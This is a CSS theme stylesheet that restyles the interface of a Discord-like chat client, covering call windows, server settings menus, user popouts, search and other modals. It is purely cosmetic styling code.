.homeWrapperNormal-2KSUEa {
    height: 100%;
    background: var(--Color003);
}

.scroller-9moviB {
    background: var(--Color004);
    border-radius: var(--Radius001);
    margin-right: 12px;
    margin-bottom: 24px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Call ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/*  Toolbar */

.headerWrapper-3NUKsd {
    padding-top: 6px;
}


/*  Status */

.status-1WEaea {
    background: var(--Color001);
    color: var(--Color006);
}

.wrapper-2qzCYF.minimum-28Z35l {
    height: 280px;
    background: var(--Color003);
}


.voiceCallWrapper-3kPwHm {
    background: var(--Color004);
}

/*  Buttons */

.colorable-1bkp8v.primaryDark-3mSFDl, .colorable-1bkp8v.primaryDark-3mSFDl .centerIcon-2G6o-T {
    color: var(--Color007);
}

.colorable-1bkp8v.primaryDark-3mSFDl {
    background: var(--Color003);
    border-radius: var(--Radius002);
}


.colorable-1bkp8v.red-33-Lnk {
    background: var(--Color001);
    border-radius: var(--Radius002);
}

.colorable-1bkp8v.red-33-Lnk:hover {
    background: var(--Color001);
    border-radius: var(--Radius002);
    filter: brightness(110%);
                       }

                       /*  Background */

                       .flexCenter-2Y_vCg .wrapper-2qzCYF.fullScreen-1tMzXY, .wrapper-2qzCYF.noChat-18KtBD {
                       background: var(--Color003);
}

.wrapper-3EGhDO {
    background: var(--Color004);
    padding: 6px 6px 6px 6px;
    border-radius: var(--Radius002);
}

/*  Call Dock */
/*
div[class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyCenter-3D2jYp alignCenter-1dQNNs noWrap-3jynv6"][style="flex: 1 1 auto;"]{
    border-radius: 30px;
    margin-bottom: 21px;
    background: var(--Color004);
}


.colorable-1bkp8v.white-3GPOIp, .colorable-1bkp8v.white-3GPOIp .centerIcon-2G6o-T {
    color: currentColor;
}

.colorable-1bkp8v.primary-3NQg8g,
.colorable-1bkp8v.primary-3NQg8g.active-1QRrIS, .colorable-1bkp8v.primary-3NQg8g:hover,
.colorable-1bkp8v.white-3GPOIp,
.centerButton-3CaNcJ,
.colorable-1bkp8v.white-3GPOIp.active-1QRrIS, .colorable-1bkp8v.white-3GPOIp:hover,
.colorable-1bkp8v.red-33-Lnk {
    background: none  ;
}
*/

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Call | Picture in Picture |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.pictureInPictureWindow-1B5qSe{
    border-radius: var(--Radius001);
    width: 440px;
    height: 248px;
    opacity: var(--picture-in-picture);
}

.pictureInPictureWindow-1B5qSe:hover{
    opacity: 100%;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Discover  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.headerImage-3X1tyY, .searchSubtitle-2jsC5X, .searchTitle-36D1cB {
    display: none;
}

#app-mount .sidebar-2K8pFh {
background: var(--Color004);
}

    .theme-dark .pageWrapper-1PgVDX {
        border-radius: 24px;
        background: var(--Color004);
        padding: 0px 0px 0px 0px;
        margin: 12px 13px 25px 12px;
    }

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Discover | Searchbar  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Search Bar */

.search-1iTphC .searchBox-2_mAlO {
    background-color: var(--Color005);
    border-radius: 90px;
    box-shadow: none;
}

.searchHeader-2I26nG {
    margin-bottom: 0px;
    min-height: 0px;
    padding-bottom: 40px;
}

.search-1iTphC .searchBox-2_mAlO .searchBoxInput-K6mkng {
    color: var(--Color008);
    font-size: 16px;
    padding-left: 24px;
}

.search-1iTphC .searchBox-2_mAlO:focus, .search-1iTphC .searchBox-2_mAlO:focus-within {
    box-shadow: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Discover | Server Card  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/


/* Background */

.theme-dark .card-3DjzTQ, .theme-dark .iconMask-3b8GzQ {
    background: var(--Color005);
    border-radius: 24px;
    box-shadow: none;
}

.guildListSection-2CS8vH {
    padding-top: 20px;
}

/* Avatar */

.avatar-22otdK {
    border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Overview  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.flag-16iIBd {
    position: relative;
    border-radius: 90px;
    margin-left: 2px;
    width: 36px;
    height: 24px;
}

.theme-dark .container-1nZlH6 {
    background: var(--Color005);
    border: none;
    border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Roles  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Sidebar */

.scroller-305q3I {
    background: var(--Color004);
    border-radius: var(--Radius001);
    margin-top: 60px;
}

/* Content */

.contentColumnMinimal-2iX-kP {
    background: var(--Color004);
    border-radius: 24px 24px 0 0;
    margin-top: 60px;
    margin-left: 60px;
    margin-right: 60px;
    margin-bottom: 0px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Emoji  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Moderation  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.checkbox-1ix_J3 {
    -webkit-box-flex: 0;
    -ms-flex: 0 0 auto;
    flex: 0 0 auto;
    border-width: 1px;
    border-style: solid;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    border-radius: 90px;
}

.defaultMarginh3-2iptLs, .defaultMarginh5-2mL-bP {
    margin-bottom: 12px;
    margin-top: 12px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Audit Log  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.contentRegion-3nDuYy {
    background: var(--Color003);
}


/* Content */

.customScroller-26gWhv>div {
    background: var(--Color004);
    border-radius: 24px 24px 0 0;
    margin-top: 60px;
    margin-left: 60px;
    margin-right: 60px;
    margin-bottom: 0px;
    padding: 40px;
}


/* Card */

.theme-dark .auditLog-3jNbM6 {
    border: none;
}

.theme-dark .divider-1pnAR2 {
    display: none;
}

/* Card | Closed */

.theme-dark .headerClickable-2IVFo9, .theme-dark .headerDefault-1wrJcN {
    background: var(--Color005);
    border-radius: var(--Radius001);
}

/* Card | Open */

.theme-dark .headerExpanded-CUEwZ5 {
    background: var(--Color005);
    border-radius: var(--Radius001) var(--Radius001) 0 0;
}


.theme-dark .changeDetails-bk98pu {
    background: var(--Color003);
    border-radius: 0 0 var(--Radius001) var(--Radius001);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Integrations  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Widget  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Input */

.theme-dark .copyInputDefault-21sXtF {
    border: none;
}

.theme-dark .copyInput-2rOSt7 {
    background: var(--Color005);
    border-radius: var(--Radius001);
}



/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Server Template  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Community | Overview  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Welcome Screen  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.enableContainer-6E-puu {
    background: var(--Color003);
    filter: brightness(110%);
                       border-radius: var(--Radius001) var(--Radius001) 0 0;
}

.previewContainer-1SS3uO {
    background: var(--Color003);
    padding: 16px;
    border-radius: 0 0 var(--Radius001) var(--Radius001);

}

/* Description */

.descriptionWrapper-1GiGtP {
    width: 100%;
    max-width: 900px;
    margin: 0 auto;
}

.input-cIJ7To::-webkit-scrollbar {
    display: none;
}

/* Text */

.descriptionInput-3b30C8[placeholder] {
    text-align: left;
    padding-right: 24px;
    padding-left: 24px;
}

/* Cards */

.welcomeChannel-1rFrIO {
    border-radius: var(--Radius002);
    background-color: var(--background-primary);
    margin-top: 8px;
    padding: 20px 20px;
}

.theme-dark .lookFilled-1Gx00P.colorPrimary-3b3xI6 {
    color: var(--Color006);
    background: var(--Color001);
}

/* Button */

.theme-dark .lookFilled-1Gx00P.colorPrimary-3b3xI6:hover {
    color: var(--Color006);
    background: var(--Color001);
    filter: brightness(120%);
                       }

                       /*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
                       /*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
                       /*||| Login |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
                       /*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
                       /*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

                       .theme-dark.authBox-hW6HRx {
                       color: #72767d;
                       background: var(--Color004);
}

.fallbackImage-31Sk4m {
    display: none;
}

.platform-win .splashBackground-1FRCko:before {
    display: none;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | User Popout ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Header */

.header-2BwW8b {
    background: var(--Color003);
    padding-bottom: 0px;
}

.reduce-motion .userPopout-3XzG_A {
    background: var(--Color003);
}

/* Background */

.theme-dark .headerNormal-T_seeN {
    background: var(--Color003)
}

.theme-dark .body-3iLsc4, .theme-dark .footer-1fjuF6 {
    background: var(--Color004);
    color: var(--Color006);
}

.userPopout-3XzG_A {
    box-shadow: var(--shadow001);
    width: 260px;
    border-radius: 24px;
    max-height: calc(90vh - 120px);
}

.bodyInnerWrapper-Z8WDxe {
    padding-right: 20px;
}

/* Activity */

.activity-11LB_k {
    background: var(--Color003);
    padding: 16px;
}

/* Status */

.customStatus-1bh2V9 {
    background: var(--Color004);
    padding: 16px 16px 16px 16px;
    text-align: left;
    line-height: 22px;
    margin-bottom: -20px;
}

/* Roles */

.role-2irmRk{

    position: relative;
    overflow: hidden;
    z-index: 1;
    border: none;
    padding: 5px;
}

.roleCircle-3xAZ1j::before{
    content: "";
    position: absolute;
    top:0;
    left:0;
    width:100%;
    height: 100%;
    background: inherit;
    opacity: .2;
    z-index: -1;
    pointer-events: none;
}

/* Note */

.textarea-2r0oV8::-webkit-scrollbar {
    width: 0px;
    height: 0px;
}


/* Footer */

.footer-1fjuF6 {
    padding: 0 16px 16px;
}

/* USRBG */

.reduce-motion .userPopout-3XzG_A {
    transform:translateZ(0);
}

.userPopout-3XzG_A .wrapper-3t9DeA::after {
    border-radius: var(--Radius001) var(--Radius001) 0 0;
    content: '';
    position: fixed;
    top: 0;
    left: 0;
    width: 260px;
    height: 174px;
    z-index: -1;
    pointer-events: none;
    opacity: 1;
    background-size: cover;
    background-repeat: no-repeat;
    background-position: var(--user-popout-position) center;
    background-image: var(--user-background);
    filter: brightness(50%) blur(0px);
}

.userPopout-3XzG_A  .header-2BwW8b,
    .userPopout-3XzG_A  .scroller-2FKFPG,
        .userPopout-3XzG_A  .footer-1fjuF6 {
            z-index: 1;
        }

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | User Profile |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Header */

.header-QKLPzZ {
    margin-bottom: 90px;
}

/* Activity */

.topSectionPlaying-1J5E4n {
    background: transparent;
}

.topSectionSpotify-1lI0-P {
    background: transparent;
}

.activity-1ythUs {
    background: var(--Color003);
}

/* Background */

.root-SR8cQa {
    border-radius: 24px;
    width: 900px;
    background-color: transparent;
}

.body-3ND3kc, .tabBarContainer-1s1u-z {
    background: var(--Color004);
}

.infoScroller-3EYYns {
    padding: 20px 12px 20px 12px;
}

/* Divider */

.userInfoSection-2acyCx+.userInfoSection-2acyCx {
    border: none;
}

/* Note */

.userInfoSectionHeader-CBvMDh {
    display: none;
    padding: 0px;
}

.note-QfFU8y {
    padding: 2px 12px 2px 12px;
    margin-right: 0px;
    margin-left: 0px;
    margin-bottom: -20px;
    margin-top: -20px;
}

.note-QfFU8y textarea {
    border-radius: 12px;
    font-size: 14px;
    line-height: 16px;
    padding: 4px;
}

/* Icon Tabs */

.connectedAccount-36nQx7 {
    z-index: 3;
    margin-top: 20px;
    margin-right: 12px;
    margin-left: 12px;
    padding: 8px 14px 8px 8px;
    width: 230px;
    background: var(--Color002);
    border-radius: 90px;
    border: none;
}

/* Spotify */

.assetsLargeImage-eYwpTX {
    border-radius: 90px;
    display: block;
    -o-object-fit: cover;
    object-fit: cover;
}

/* Buton */

.lookFilled-1Gx00P.colorGreen-29iAKY {
    background: var(--Color001);
    color: #fff;
}

.lookFilled-1Gx00P.colorGreen-29iAKY {

    background: var(--Color001);
    color: #fff;
}

/* USRBG */

.header-QKLPzZ .wrapper-3t9DeA::after {
    z-index: -1;
    content:'';
    position: absolute;
    top: -20px;
    left: -20px;
    width: 900px;
    height: 240px;
    opacity: 1;
    background: var(--user-background) center/cover no-repeat;
    background-color: var(--Color002);
    filter: brightness(60%) blur(0px);
}




/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Verify Phone |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.phoneField-38N1bJ .countryButton-3xq3Ts {
    border-radius: 24px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Pinbox |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.messagesPopoutWrap-1MQ1bW {
    border-radius: 24px;
    top: 10px;
    width: 900px;
}

.messageGroupWrapper-o-Zw7G {
    border-radius: 24px;
    margin: 12px;
}

.messagesPopout-24nkyi {
    padding: 0px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Inbox ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.theme-dark .header-2-Imhb .tabBar-1kuXvJ .tab-ck0077.active-1MbGPa {
    background-color: var(--Color001);
    border-radius: 90px;
}

.recentMentionsPopout-3rCiI6 {
    width: 35vw;
    max-width: 900px;
    min-width: 900px;
    max-height: 80vh;
}

.container-enaOkj {
    border-radius: 24px;
}

.container-3u944p {
    background: var(--Color004);
}

.icon-1Itzco {
    background-color: var(--Color003);
    border-radius: 80px;
    color: var(--text-muted);
    padding: 22px;
}

/* Unreads */

.icon-1Itzco {
    background-color: var(--Color003);
    border-radius: 80px;
    color: var(--text-muted);
    padding: 22px;
}

.stars-1YAEQv {
    display: none;
}

.size12-3cLvbJ {
    font-size: 13px;
    line-height: 16px;
}

/* Mention */

.guildIcon-3Co6k- {
    background-color: var(--Color002);
    border-radius: 90px;
}

    .secondary-dIudih {
        background-color: var(--Color002);
        color: var(--Color008);
    }

.container-3iAQ-0 {
    background-color: var(--Color005);
}


.channelHeader-3Gd2xq {
    background-color: var(--Color005);
}

.messageContainer-gbhlwo {
    background-color: var(--Color004);
    border-radius: 24px;
    padding: 0px;

}

.container-3iAQ-0 {
    margin-bottom: 0px;
    padding-left: 20px;
    padding-right: 20px;
}

.tertiary-aMXF0g {
    background-color: var(--Color002);
    color: var(--Color008);
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Status Selection |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.menu-3sdvDG {
    border-radius: 20px;
}

.item-1tOPte {
    border-radius: 24px;
}

.description-2L932D {
    margin-bottom: 0px;
    font-size: 0px;
    line-height: 0px;

}

.scroller-3BxosC {
    padding: 8px 8px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Contex Menu ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.wrapper-2aW0bm {
    background-color: var(--Color002);
    border-radius: 24px;
    box-shadow: var(--shadow001)
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Share Media ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */


.attachPopout-36hjtN {
    border-radius: 24px;
    background-color: var(--Color005);
    box-shadow: none;
}

.attachPopoutRow-3iqqu1 {
    border-radius: 90px;
    color: var(--Color008);
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Search History |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.searchResultsWrap-3-pOjs {
    background-color: var(--Color003);
    width: 800px;
}

.searchResult-9tQ1uo:before {
    z-index: 1;
    top: 0;
    background-image: linear-gradient(0deg,#0000,var(--Color003));
                                      }

                                      .searchResult-9tQ1uo:after {
                                      bottom: 0;
                                      background-image: linear-gradient(180deg,#0000,var(--Color003));
                                      }

                                      .channelName-1JRO3C {
                                      background: var(--Color003);
}

.searchResultMessage-1fxgXh.hit-1fVM9e {
    background: var(--Color004);
    position: relative;
    z-index: 1;
    max-height: none;
    box-shadow: var(--shadow001);
    border: none;
    border-radius: 24px;
    padding-bottom: 20px;
    padding-top: 20px;
}

.searchResult-9tQ1uo.expanded-w_LCGl {
    background: var(--Color005);
    border-radius: 24px;
    border: none;
    padding-bottom: 20px;
    padding-top: 20px;
}

.expanded-w_LCGl .searchResultMessage-1fxgXh.hit-1fVM9e {
    background: var(--Color004);
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Color Picker |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.theme-dark .colorPickerCustom-2CWBn2 {
    background: var(--Color004);
    border: none;
    box-shadow: var(--shadow001);
    border-radius: var(--Radius001);
}

.backdrop-1wrmKB {
    opacity: 0.1;
    background: #fff;
    transform: translateZ(0px);
}

.saturation-1FDvtn>div, .saturation-1FDvtn>div>div {
    border-radius: var(--Radius001);
}

.saturation-black {
    border-radius: 20px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
